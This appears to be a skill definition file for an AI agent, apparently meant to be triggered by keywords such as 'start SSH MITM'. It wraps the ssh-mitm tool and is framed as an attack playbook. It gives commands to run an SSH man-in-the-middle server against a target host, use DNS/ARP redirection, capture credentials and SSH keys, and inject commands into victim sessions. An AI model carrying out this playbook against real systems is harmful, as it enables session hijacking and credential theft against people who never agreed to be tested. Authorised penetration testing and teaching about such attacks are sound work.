---
name: ssh-mitm-intercept
description: "ssh-mitm hijacks SSH sessions and captures credentials. Signals: MITM, mitm, start SSH MITM, listen port, session hijack"
zh-signals: "ssh-mitm: SSH 会话劫持+凭据截获。信号:中间人,mitm,起 SSH 中间人,监听端口,劫持会话。"
---

# ssh-mitm

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/ssh-mitm/ssh-mitm
- 上游 License:NOASSERTION(需人工)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install ssh-mitm
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `ssh-mitm server --remote-host real.server.com` | 起 SSH 中间人 |
| `--listen-port 2222` | 监听端口 |
| `受害者连接: ssh -p 2222 victim@attacker` | 劫持会话 |
| `--store-ssh-keys` | 记录密钥 |

## 攻击场景 Playbook

### SSH 会话劫持+凭据截获

```bash
ssh-mitm server --remote-host 10.0.0.5 --listen-port 2222
# 配 DNS/ARP 引导流量 → 用户 ssh 时看到 host key 警告仍继续 → 会话全明文可见
```

## 注意事项

现代 SSH MITM(Python);能实时注入命令到受害会话(--ssh-intercept)。
